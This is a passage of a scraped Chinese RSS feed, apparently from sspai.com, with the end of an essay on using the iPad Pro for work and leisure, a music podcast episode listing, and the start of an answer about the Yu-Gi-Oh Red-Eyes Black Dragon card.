Beta 版本的 FigJam，支持多人协作大白板功能，里面也可以绘制简易的线框图和各种标签注释，非常适合多人讨论。</p>\n<p>得益于在线文档的兴起，我原本的工作流程在 iPad 上几乎没有受到影响。</p>\n<h3>2. 用 Figma 做原型和设计稿</h3>\n<p>我本科是设计专业，所以会经常参与一些视觉和宣传材料的设计。</p>\n<p>之前我一直使用 Sketch 做日常的原型设计和视觉设计，但 Sketch 在跨平台上面还是有着比较大的局限，为了实现团队协作，我把项目都搬到了 Figma 上。</p>\n<p>Figma 虽然是一个依赖于 Web 的设计软件，但在性能和操作体验上已经不输任何的原生软件，尤其是适配了 M1 版本的桌面端 Figma，流畅的足以让我相信原生运行不一定是未来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/0ce050f9acd90056abdfa54baff15fe7.jpeg\"></figure><p>既然是依靠 Web 的应用，有浏览器的 iPad 自然可以分一杯羹，实际体验中在 iPad 上用 Figma 是挺流畅的，这证明了 iPad Pro 的 Web 性能十分出色，在处理这种非常依靠 GPU 渲染的设计软件上，iPad 展现了出色的能力，M1 的加入也让这体验往上升了一级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/4e45a8728cb6c25a533a25414dddfd18.jpeg\"></figure><p>我推荐你使用 Figurative 这个软件，它很好地解决了用触控板移动画布和缩放的问题，你很难想像在 iPad 上做设计软件能做到这个程度，光标的交互配合 Drag&amp;Drop 的拖拽，和在 Mac 上使用体验别无二致，唯一需要注意的就是字体库的问题，需要特别处理。</p>\n<h3>3. 日常写一些文章</h3>\n<p>我通常喜欢使用 Drafts 5 进行草稿的构建，日常我的一些小灵感都会通过 Drafts 快速记录下来，看到想要收藏的内容都会被保存在这里。你可以简单理解为一个纯文字版「闪念胶囊」。</p>\n<p>写完大纲和草稿后我会使用 Ulysses 把剩余内容补充完，Ulysses 的大纲功能对写文章而言有很大帮助，图片存储和加载的性能也好于其他软件，适合喜欢把图丢进去排版的人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2f808e5e158ffb776280fc7381b74892.jpeg\"></figure><p>我喜欢在 iPad 上写作，倒不是因为键盘很好用，也不是因为有很好用的软件，单纯是我觉得在 iPad 上更有仪式感，也能更专注的完成文章。我已经在 iPad 上写下了数万字的内容，它帮我实现了很多事情。</p>\n<h3>4. 图片编辑和筛选</h3>\n<p>我是基本不在电脑上修图的那一类人，一方面我的显示器并不高级，色准和表现和实际的情况都有偏差，另一方面我也不喜欢用鼠标调整各种参数，整体交互给我一种奇怪的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/e72b88901863e8fff9387d6f8ddaf6eb.jpeg\"></figure><p>iPad 是一个出色的显示器，同时搭配 Apple Pencil 和触屏，你可以轻松选定不同区域进行修改，用手调节色环和调节条的感觉更符合交互直觉。它改善的不仅是成片结果，更是优化了修图过程中的体验。</p>\n<blockquote><p>「亲手挑选喜欢的图片」，我想我喜欢这种感觉。</p></blockquote>\n<h3>5. 流媒体娱乐时间</h3>\n<p>iPad 是很好的观影设备，主要体现在它便携的高规格屏幕，尤其是 21 款 iPad Pro 12.9 寸上配备的 Mini LED 屏幕，这块移动端的最强屏幕，极高的亮度和对比度拿来看 Apple TV+、Netflix、Disney+ 的高质量 HDR 内容是极为享受的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/0a6e4f20b5cf79c05f293eaa5afb5f46.jpeg\"></figure><p>如果你拿来看爱奇艺这类国内流媒体，并不能完全发挥这块屏幕的能力，一方面片源本身的码率不够高，另一方面这些平台宣传的 HDR 调色总会显得有种饱和度拉满地奇怪视觉感。希望国内的流媒体质量也能跟着硬件提升持续改善，毕竟订阅价格并不便宜。</p>\n<p>其实我并不经常在 iPad 上看这些系列剧，电视是我看剧的首要选择。我喜欢在桌面上喝着咖啡，在 iPad 上看看油管上的内容，欣赏一下 HDR 视频带来的那种真实和震撼的感觉。</p>\n<h3>6.「或许」 能摸鱼的技巧</h3>\n<p>我在写这篇文章之前，很多人问我 iPad 的摸鱼技巧。实话说 iPad 本身的多任务和快捷切换属性挺适合摸鱼的，三指一刷切换到另外一个应用，又或者唤出侧边栏再隐藏，似乎都是一些比较 \" 方便 \" 的摸鱼方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/81cd910d642617a59ce45f68d607e8b6.jpeg\"></figure><p>iPadOS 15 的新版 Safari 上新增了标签组的功能，当你会使用快捷键 <code>Command+Option+上方向键</code> 后，可以瞬间在工作的网页和休闲网页中来回切换，不需要担心被看到。</p>\n<p>画中画模式也是我觉得很适合摸鱼的功能，像 Bilibili、爱奇艺等流媒体平台都已经支持这个功能，你可以开一个小窗口放在不显眼的地方，带上耳机，打开工作文档和微信，悄悄地开始你的摸鱼时刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/7686afa3412a3b0a31ccf5f9cc198f8b.jpeg\"></figure><p>当然我不是一个喜欢摸鱼的人，但我会经常观察摸鱼的同事们到底是怎么做的。结果我觉得摸鱼最好的方式就是换一个可视角度奇差，亮度奇低的显示器，这样别人基本上就不会瞅到你的电脑在播放什么内容。</p>\n<p>相反 iPad 这种亮度和清晰度奇高的产品，几米开外都可以清楚看到你在做什么，实在没有什么好机会。</p>\n<h2>三 . 我喜欢 iPad 独特的地方</h2>\n<h3>1. 简单且自由的环境</h3>\n<p>iPad 某种程度上对我来说是「更自由」的设备，它并不像 Mac 是一个目的性很强的设备，每当我坐在 Mac 前必定是在做重要的工作，这是一种紧迫的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d79c53e844a4cfd5748067b22121acfa.jpeg\"></figure><p>在 iPad Pro 面前，状态是休闲随心的，事情是可商量的，这让我在 iPad 上的创作欲望比在 Mac 上更高，更适合初期灵感的构思。</p>\n<blockquote><p>这是我喜欢 iPad 的地方，电脑总把人们限定在了固定的形式内，用效率来衡量一切，而有趣伟大的事情，并不会在事情的一开始就与效率相关。</p></blockquote>\n<h3>2. 找回书写的乐趣</h3>\n<p>以往其他设备上的触控笔，我只有在打开画板时才会想到要拿起笔，Apple Pencil 则是一根可以长时间抓在手中的笔，因为它与 iPad 的交互关系远不止作画。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/626ff8e2ba63836c6e7685ff8f145ce4.jpeg\"></figure><p>在需要头脑风暴思考些细节的时候，我都会从妙控键盘上拿下 iPad，拿起笔，在网页和快捷笔记中切换，在画布上呈现一些方便思考的信息，这是快速且自然的表达方式。</p>\n<p>我也时常喜欢拿 iPad 来做数独，遇到需要尝试的数字，可以复制出几页同时验证结果，有一种开了物理外挂的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/f728fe8845db148cdac25f1b7f762dba.jpeg\"></figure><p>有的人会说妙控键盘和笔是冲突的，放在上面不好书写。解决的方法很简单，把平板拿下来就好了，这里面没有什么胶水强制合体的机制。</p>\n<blockquote><p>轻松地取下键盘和装入键盘，在手写平板和电脑模式中肆意穿梭，这不就是 iPad 最大的优势吗？</p></blockquote>\n<h3>3. 不同场景的专注模式</h3>\n<p>iPad OS 15 上苹果将「勿扰模式」升级成了「专注模式」，你可以使用不同的 「专注」 来调整应用通知的推送模式和桌面布局方案。这意味着你可以在不同的场景下使用多种设置，为每个具体的场景调节。</p>\n<p>例如我在工作时不想收到任何资讯和流媒体的更新推送，我在娱乐休闲时不想收到工作或者电话之类的推送，你都可以通过专注模式实现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/972bb154ebdd83f71adddedd6422b065.jpeg\"></figure><p>专注模式支持自动化处理和快捷指令调用，意味着你可以根据设定来达到完全自动化执行的情况。</p>\n<p>例如早上 9 点到公司后开启工作模式，桌面就会变成和工作相关的组件和应用，同时屏蔽掉所有的社交信息，推送今天的工作计划任务。下午 6 点下班后关闭工作模式，恢复所有通知，之前被拦截的所有新剧集信息或者社交信息都会聚合一次性显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5a6dc6cc900997e62e97c7378ff49a75.png\"></figure><p>专注模式类似于一种「多用户登录」功能，给予你在同一个系统内设置不同的权限和显示布局的功能，非常适合 iPad 这种覆盖多场景设备。</p>\n<h3>4. 为细分场景做服务</h3>\n<p>iPad 是目前输入交互最丰富的设备，光标系统、键盘、触控、全局无框手写输入，每一项完成度都非常高，所有的软件都能轻松调用且合理展现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/82597944021f58c26466f5647ec6a2ba.jpeg\"></figure><p>区别于电脑，iPad 触屏 + 外设的形态更方便触达细分场景，让笔记、会议讨论、项目演示等交互场景体验更直接、更有交互感，而不仅仅是一种向电脑里输入和屏幕输出的关系。</p>\n<p>这些场景都是在使用过程中逐步发现的，也不是说一开始用 iPad 就冲着这个目的去的，最后我选择 iPad 是因为它确实给我留下了深刻的印象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/34b6ea50da2831f633b5af6a44f0b4a1.jpeg\"></figure><p>iPad 不可能在做传统表格、建模和工程类文件等事项上比电脑出色，也没有办法取代电脑在专业领域的作用，这也从来都不是 iPad 的目标。更好的服务于这些事情之外电脑无法很好兼顾的场景，优化这些场景的体验，这才是 iPad 的价值。</p>\n<blockquote><p>何必纠结于谁取代谁呢？两者是互帮互助的关系，做自己擅长的事情，别想着把别人擅长的事情抢过来做，这句话不仅适用于设备，也适用于人。</p></blockquote>\n<h2>四 .iPad 上亟待解决的问题</h2>\n<h3>1. 文件系统和文件分享</h3>\n<blockquote><p>以「文件」为核心的传统电脑和以「APP 和服务」为核心的移动设备间的转换。</p></blockquote>\n<p>最开始使用 iPad Pro 工作，我会迷茫不知从哪开始我的工作，这是因为我原本的电脑上有桌面，桌面上有各种文件，我早已习惯找到文件双击打开应用来开始新的工作。</p>\n<p>在 iPad 上逻辑并不如此，平板的界面上是各种 APP，文件的概念在移动端里并不突出，当我依赖「文件」这个载体的时候，在 iPad 上工作的体验就会非常糟糕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5ae9c143299ab17a94598fb5e8552f4e.jpeg\"></figure><p>去年开始我把日常工作都搬到了线上，在线文档、Web 端 Figma 设计以及 Notion 这类在线应用时，在 iPad 上的体验就变得简单许多。我只需要打开 APP，找到尚未完成的的工作即可，无需关注文件在哪。当我的工作核心变成了在哪个应用里，文件的概念自然就被弱化了。</p>\n<p>当然工作中我仍会遇到各种需要传输文件的场景，iPad Pro 羸弱的文件管理系统，依旧需要繁复的操作才能发送文件。文件的跨应用传输也需要开发者们去做适配，否则只能依靠系统的 Share 组件操作，效率很低。要解决这些问题，苹果的系统级改进和开发者的适配都是关键。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/4fdea9fd462503510c96bcac182aaca0.jpeg\"></figure><p>在 iPadOS 15 上，苹果似乎并没有展现出将 MacOS 级的文件管理带入 iPadOS 的意愿，或许苹果更愿意相信未来用户们的工作，需要的是在线同步「数据」，而不是来回传输「文件」。</p>\n<p>如果你依旧十分依赖「文件」，那 iPad 不是一个很好的工具，倘若你想在 iPad 上获得更自然的体验，或许你可以尝试用在线文档和工具来改善。</p>\n<h3>2. 缺少功能完善的专业级应用</h3>\n<blockquote><p>系统底层是否完善很重要的判断因素就是，专业级应用是否能登陆。</p></blockquote>\n<p>在过去的几年里，在专业软件层面，Adobe 推出了 iPad 版本的 Photoshop 和 illustrator，但总体来看针对 iPad 的专业级软件数量仍然太少，专业级用户都期待着像 Final Cut Pro 等软件能够登录 iPad。</p>\n<p>当然，即便这些专业软件能在 iPad 上使用，也肯定无法运行完整功能，系统本身的原因是一部分，我认为更多考虑在于针对 iPad 这个产品形态，要照顾触屏交互和 Apple Pencil 的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/10a8d79c89cbe270e00ee6c7a9c38b27.jpeg\"></figure><p>这些软件登录 iPad 的意义并不是为了完整取代电脑的，而是为了能够把创作流程分拆到不同部分，再根据统一的格式在桌面端重新串联起来，这对于连续性创作有很大的帮助。</p>\n<p>只要这个生态正处于良性的发展，专业软件迟早会来。iPad 目前已经给出了更强的性能和更为成熟的光标系统，开发商们有更多的空间下放功能，剩下的就看开发商们的努力了。</p>\n<h3>3. 开发者对 iPad 版适配理解不够深入</h3>\n<blockquote><p>开发者认为 iPad 上只需正确显示软件即可，这极大影响 iPad 的体验。</p></blockquote>\n<p>iPad 上的应用生态质量是远不如 iPhone 和 Mac 的，很大程度上是因为开发者们没有重视 iPad 端的开发，粗暴理解为只需要将 iPhone 版本放大套在 iPad 上即可，这就导致了屏幕面积被大量浪费，排版布局诡异，也没有适配原生的 iPad 交互动画，使用体验极差。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/8b82fcf712f5291f4736a265bd25c6f6.jpeg\"></figure><p>苹果还推出了 Mac Catalyst 方便开发者从 iPad 迁移到 Mac 上，这一举措进一步将这种放大版的软件带到了 Mac 上，无疑是一种灾难。</p>\n<p>客观来说，要求开发者重构 iPad 版本的布局和交互是有难度的。毕竟 iPad 的核心用户群数量都十分稀少，就更别指望产品经理们能够很好地理解 iPad，并作出合理、符合使用场景设计。况且还有成本因素需要考量，在花钱买一个重构的 iPad 应用和免费用 iPhone 的放大应用上，绝大部分用户可能都会倾向于后者，这也就导致没有开发者会费力去重构设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2823d67338e94d2cda0c27412f04eda9.jpeg\"></figure><p>要解决这个问题，除了需要开发者能够对 iPad 的使用场景和体验做深度优化外，还需要有更多的付费用户来承担起这种优化的成本，这是相辅相成的。现阶段能够很好适配 iPad 的软件开发者，都是非常用心的。</p>\n<h3>4. 几乎无法扩展外界显示器</h3>\n<blockquote><p>无法扩展显示意味着受限的工作区域，这影响了多任务场景。</p></blockquote>\n<p>目前 iPad 连接外部显示器只能以镜像状态投影，一些适配了的软件能够调用外接显示器全屏作为预览框，Shiftscreen 能实现浏览器的多屏输出，这就是 iPad 仅有的分屏能力。在导致在 iPad 办公的这段时间里，我桌面上的 4K 显示器一直处于闲置状态。</p>\n<p>即使是 iPad Pro 12.9 寸的屏幕大小，也最多容纳 2 个 APP，无法将更多内容显示在其他地方，这就影响了多任务场景的发挥。我既做不到在写文章的时候想同时看几篇参考文章，也做不到同时开好几个文档中来回编辑处理数据，这让人沮丧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/9af8eeeb4ae1ac605a89d5aa31d670f5.jpeg\"></figure><p>苹果似乎还在思考外接屏幕上的处理逻辑，这不是一个简单问题。在投屏的状态下会出现「触屏和非触屏的交互融合」「小屏幕和大屏幕的内容排版显示差异」以及「是否应该在大屏幕内窗口化」等系列问题。要想用合理的逻辑解决这些问题，需要更多时间。</p>\n<h3>5. 糟糕的电量</h3>\n<blockquote><p>iPad 已经不是那个在续航让人安心的设备。</p></blockquote>\n<p>自从 ProMotion 登录 iPad Pro 上以后，iPad 的连续续航时间就回落到了手机水平，在搭配妙控键盘的情况下，在户外用一整天的可能性几乎 0。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/cfecccef2078f5bd144c2f11d51d575d.jpeg\"></figure><p>这里面也有一些客观因素，比如说功耗更大屏幕，电池更小，即便是 M1 出色的功耗控制，也必定会得出比 Macbook 更短的续航时间。这似乎是短时间内无法解决的问题，技术上已经做到极限了。</p>\n<h2>五 .iPad 生态的转折点与未来</h2>\n<p>回顾 iPad 整个发展生态，苹果无外乎在做两件事情，优化 iPad 的交互输入方式和丰富 iPad 的软件生态。过去几年里，我在 iPad 上看到了许多重要的转折点：</p>\n<h3>1.Apple Pencil—允许精确的交互输入方式</h3>\n<p>Apple Pencil 的加入是苹果为 iPad 新增的信息输入方式，这极大扩展了 iPad 的使用场景，电子化书籍笔记让 iPad 成为了大学生群体中很受欢迎的工具。</p>\n<p>去年 iPad OS 14 苹果新增了输入框直接书写文字，进一步提高了 Apple Pencil 在全局的输入体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/fe56ea2a8c9cc97e5d0747d0eee766ff.jpeg\"></figure><h3>2.TouchPad—允许更复杂的交互输入方式</h3>\n<p>苹果在去年推出了妙控键盘，同时引入了专门为 iPad 设计的光标系统。光标的加入让 iPad 有能力操作功能复杂的软件，这为 iPad 深入办公场景做了最大程度上的支持，也促使更多专业软件登录 iPad。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6db43867a758314bcadf61eca120612a.jpeg\"></figure><h3>3. 在线协同应用的兴起—工作软件门槛的降低</h3>\n<p>苹果一直是云服务的支持者，在 Web 端应用、协同办公和在线化应用兴起的大环境下，以浏览器和 APP 为核心的应用场景越来越多，这也使得 iPad 能够融入更多的场景中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/82879443f56b7b3fb009bce902b64e87.jpeg\"></figure><h3>4.M1 底层统一 —应用跨平台门槛降低</h3>\n<p>今年苹果在全新的 iPad Pro 2021 上搭载了 M1 芯片，这就完成了 iPad 和 Mac 两个平台硬件上的统一，意味着未来两个平台间的应用生态共享会更加紧密，专业软件登录 iPad 的工作量会降低，开发者更多是需要思考应用在两个平台上所面对的交互问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/79be313bb28c759854e1cac2d36a002a.jpeg\"></figure><h3>5. 未来的方向</h3>\n<p>在 WWDC 21 之前，iPad 用户们都期待苹果能够把 MacOS 下放到 iPad 上。虽然我很希望看到这一幕的发生，但我得说这样做太不苹果了。</p>\n<p>苹果在给 iPad 设下的路线上有条不紊地推进着，更好地融合移动端触屏交互和桌面端光标系统，更好地融合移动端和桌面端的应用开发底层。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/46225db0637a8eedc919532106f94adf.jpeg\"></figure><p>最终我们或许将看到的是 「同一套软件」 在 「各端场景交互和体验中」 展现出应有的特色，这是一个可期的未来。</p>\n<h2>六 . 我是如何看待 iPad</h2>\n<p>每个人心目中都对 iPad 这种形态的设备有着不同的看法，不同的工作内容、习惯和喜好都会导致不同的结果，这些看法都各自代表了自己的使用状况，对于那些有着相同场景的人来说，都具备参考意义。</p>\n<p>2 年前我认为对 iPad Pro 最好的总结来自 MKBHD 的：</p>\n<blockquote><p>\"It’s not a computer replacement but a computer alternative.\"</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/01c3f00316d62f5978943e1136065c0e.jpeg\"><figcaption>The iPad Only Challenge! _ From Marques Brownlee Youtube</figcaption></figure><p>iPad Pro 是不同场景下对设备的不同选择结果，而不是对传统电脑的替代，那时二者的使用场景还有着比较明显的区隔。而今天我的观点更倾向于 Mac 是 iPad 在专业场景上的延伸。</p>\n<blockquote><p>\"Mac is an extension of iPad in professional scenarios.\"</p></blockquote>\n<p>这意味着 iPad 作为我的核心办公设备在 80% 的场景下可以胜任。如果我遇到更复杂的工作，例如更为精确的设计稿和文档处理，我会使用 Mac 来完成这部分工作，这是专业需求的延伸，和专用用户用服务器渲染，用数位板画图的理由一样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/458ec93694e0d6149f10b95246382c62.jpeg\"></figure><p>虽然这个观点目前看来有点站不住脚，但随着「互联网触屏交互设备原住民」的这一代年轻人长大，他们对于计算设备或许有崭新的理解，传统电脑操作走向专业化的时代初见端倪。</p>\n<h2>七 .iPad 和用户间的互相成长</h2>\n<p>iPad 在各行业都发挥着出色的表现，越来越多用户尝试用 iPad 做出改变，iPad 的发展离不开这些把设备应用在各个场景，推动着软件功能更新和适配的用户。</p>\n<h3>1. 让学习和知识管理更有逻辑</h3>\n<p>在我上大学的那个年代，iPad 只是一个大号的娱乐设备，如今 iPad 已经成为了大学里学习的重要工具，在记笔记、刷题、录课程、查资料、解构书籍等方面都有着极为出色的体验，无论是在课堂还是其他时刻，当你想收获和处理知识的时候，iPad 上强大的软件工具如 GoodNotes、MarginNote、DevonThink 等都能够为建立知识库提供极大帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6da354722beb52638fcee104d14d3500.jpeg\"></figure><h3>2. 为灵感创造提供一张自由的白纸</h3>\n<p>对于这个时代来说，工作内容的多元化让我们有更多的空间自由选择生产工具，iPad 多变的形态和更加亲切的交互感成为了很多场景下的新选择。尤其在这个强调创造力和灵感的时代，iPad 更适合记录和存储转瞬即逝的火花，不拘于形式，拥有更多想象空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/8314ddc5f8ef0eb20632bbbe0649311b.jpeg\"></figure><h3>3. 在繁忙生活之余添加多一份愉悦</h3>\n<p>对于那些并不热衷于使用 iPad 办公或者学习的人，用 iPad 开心看剧玩游戏何尝不是一种愉悦的事情。</p>\n<p>大可不必觉得「自己如果不用 iPad Pro 产出一篇惊世奇文或者一段旷古视频就是对不起买这台机器」，也不必在乎别人怎么定义 iPad，但凡这台机器在你手中不是放在柜子里吃灰，无论是给你带来工作上的帮助，还是给你带来欢乐，它都是有价值的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/966db61a970f78d0427bf0bbd3cb4609.jpeg\"></figure><blockquote><p>it's never been a shame to be nonproductive.（没有生产力从来都不是一件耻辱的事情）</p></blockquote>\n<h2>八 . 到底我们为什么这么喜欢 iPad</h2>\n<p>如果我们把时间倒回到 2010 年，当乔布斯拿出 iPad 的那一瞬间，获得了台下和屏前观众经久不息的掌声。</p>\n<blockquote><p>是因为人们觉得这台 iPad 具有惊世生产力吗？ 是因为人们觉得 iPad 能替代手中的笔记本电脑吗？</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/40c6730b667640397425fc768fdffa7e.jpeg\"><figcaption>Live photo of iPad Event on 2010_From internet</figcaption></figure><p>我想不是的，这么多年过去了，苹果没有忘记当初人们为什么这么喜欢 iPad，因为这是一台有着简单交互、趁手尺寸的设备，在手机和电脑中间创造了一个新的形态，既能融入工作，也能给生活带来一点激情，这是电脑从来都无法取代的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/cb2aceb6847b4b8376b3052c1e0b7cbe.jpeg\"></figure><blockquote><p>\"It's just an iPad.\" 或许就是它从过去到未来一直都想传递的事情</p></blockquote>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/67439"},{"title":"FM3.14｜音乐最近听什么 EP03：幸福之歌","date":"2021-07-03 06:26:36","description":"\n<p>第三期刚好遇上我派稿霸@化学心情下2 的婚礼，以及我即将到来的十周年结婚纪念日，所以这一期假公济私聊聊和爱情、生活有关的音乐，谓之「幸福之歌」。本期歌单长达四个多小时，节目嵌入的歌曲也是不少，希望大家喜欢～周末愉快！</p>\n<div class=\"ss-audioSource\" src=\"https://r.typlog.com/eyJzIjoxOTQ2LCJlIjo4Mzc3LCJwIjoyLCJ1IjoiMTI4OC5tcDMifQ.fU3i2-4GmP8uqHQuyY-C-ZintYk/fm314/8374710340_701288.mp3\" title=\"FM3.14｜音乐最近听什么 EP03：幸福之歌\" cover=\"https://cdn.sspai.com/2021/07/03/5ed052f101ca06e66551fdfc91d699ec.jpeg\" artist=\"挨石\" chapter=\"[{&quot;name&quot;:&quot;开场曲 - fu'is 星星歌&quot;,&quot;time&quot;:0}, {&quot;name&quot;:&quot;All is Love - Karen O&quot;,&quot;time&quot;:710}, {&quot;name&quot;:&quot;Intro - 达达乐队&quot;,&quot;time&quot;:923}, {&quot;name&quot;:&quot;夏末的萨克斯手 - 曹方&quot;,&quot;time&quot;:1211}, {&quot;name&quot;:&quot;Sunday Trip - Torte Bus&quot;,&quot;time&quot;:1369}, {&quot;name&quot;:&quot;生活的诗意 - 彭坦&quot;,&quot;time&quot;:1558}, {&quot;name&quot;:&quot;罗马假日 - 旅行团&quot;,&quot;time&quot;:1694}, {&quot;name&quot;:&quot;永远在一起 - 许哲佩&quot;,&quot;time&quot;:1816}, {&quot;name&quot;:&quot;Grow Old with Me - Tom Odell&quot;,&quot;time&quot;:1948}, {&quot;name&quot;:&quot;Kiss Me - Sixpence None the Richer&quot;,&quot;time&quot;:2370}, {&quot;name&quot;:&quot;Sweet Song - Blue&quot;,&quot;time&quot;:2588}, {&quot;name&quot;:&quot;Love Song - The Cure&quot;,&quot;time&quot;:2877}, {&quot;name&quot;:&quot;Friday I'm in Love - The Cure&quot;,&quot;time&quot;:3177}, {&quot;name&quot;:&quot;With or Without You - U2&quot;,&quot;time&quot;:3567}, {&quot;name&quot;:&quot;誓い - 宇多田ヒカル&quot;,&quot;time&quot;:3924}, {&quot;name&quot;:&quot;不变形的爱 - 祁紫檀&quot;,&quot;time&quot;:4124}, {&quot;name&quot;:&quot;如果有一件事是重要的 - 陈珊妮&quot;,&quot;time&quot;:4348}, {&quot;name&quot;:&quot;天下无双 - 陈奕迅&quot;,&quot;time&quot;:4828}, {&quot;name&quot;:&quot;早去早回 - 陈洁仪&quot;,&quot;time&quot;:5076}]\">Audio</div>\n<h2><strong>🎵 歌单里还有更多</strong></h2>\n<p><a href=\"https://open.spotify.com/playlist/71hXixbqgujR9KVGtmXjMK?si=efa47ea0309d497e\">Spotify</a> （欢迎搬运并告诉我网址）</p>\n<h2><strong>📻 订阅节目</strong></h2>\n<ul>\n<li><a href=\"https://fm314.typlog.io/episodes/feed.xml\">RSS 地址</a></li>\n<li><a href=\"https://podcasts.apple.com/cn/podcast/id1492046083\">Apple 播客</a></li>\n<li><a href=\"https://open.spotify.com/show/5dLciVkSqhvaVRUcYuKxZX\" target=\"_blank\">Spotify</a></li>\n<li><a href=\"https://www.xiaoyuzhoufm.com/podcast/5e3d212c418a84a046197d10?s=eyJ1IjoiNWU3YzlhYjlhMmYyZTUwM2NlYzNjZDcwIn0%3D%0A\">小宇宙</a></li>\n</ul>\n<p>感谢聆听，也欢迎大家留言交流、分享音乐，对节目有任何建议也欢迎提出～下期见！</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67540"},{"title":"《游戏王》中真红眼黑龙为什么被称为顶级卡片？","date":"2021-07-02 15:30:09","description":"\n<p>题主的问题，在原作中真红眼黑龙出场的第一页交代清楚了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-de8496b166a074c4d842b8f8ba9b40f3_720w.jpg?rss\" data-rawwidth=\"1965\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-de8496b166a074c4d842b8f8ba9b40f3\" data-watermark-src=\"v2-99b51489d7eaf9cfd7fd7cea5b43ef36\" data-private-watermark-src=\"v2-982a92469743b3c4a250c435d03c7efb\"></p>\n<p>在卡片交易市场行情中价值数十万的顶级稀有度，以及顶级的攻击力数值。这就是真红眼黑龙被称为顶级卡片的理由。</p>\n<p>首先说它数值顶级这点，你能在早期（决斗王国篇）数出很多攻击力超过真红眼的卡。但那种靠组合或战术堆起来的数值很显然还是不能算这张卡本身nb的。比如羽蛾的大飞蛾需要用很苛刻的条件让毛虫进化；神鹰女郎需要靠大量装备；鬼骨冢的活死人战术要用长时间来让僵尸慢慢强化。只算基础能力值的话，真红眼黑龙确实已经非常高了，在它之上的青眼白龙、黑魔术师、恶魔的召唤，都一样是被评价为万里挑一的稀有卡的。</p>\n<p><br></p>\n<p>大概也是因为比起各种铺垫的青眼白龙，它出现得太突兀了，当时的动画组在这上面做了些文章，围绕这张卡专门做了一个剧场版动画。这就是东映出品、延续自朝日版游戏王的，游戏王历史真正意义的第一个剧场动画，1999年剧场版《游戏王》，民间俗称《游戏王-真红眼黑龙》。下面跟大家讲解下这部30分钟的剧场动画剧情。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4ba72e49cf1604015a850ed10fbf1ccc_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4ba72e49cf1604015a850ed10fbf1ccc\" data-watermark-src=\"v2-76ebddacc6660d93d00c17c6693b32bc\" data-private-watermark-src=\"v2-dc4afc5dc54109d6e3de088d9b817937\"></p>\n<p>故事讲述的是武藤游戏邻居家，一个胆小懦弱、常被同龄人欺负的小孩，青山翔吾。他在偶然间去卡店抽包，开出了真红眼黑龙。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c3f4a3a47a435edf185bc6db1a208e0_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4c3f4a3a47a435edf185bc6db1a208e0\" 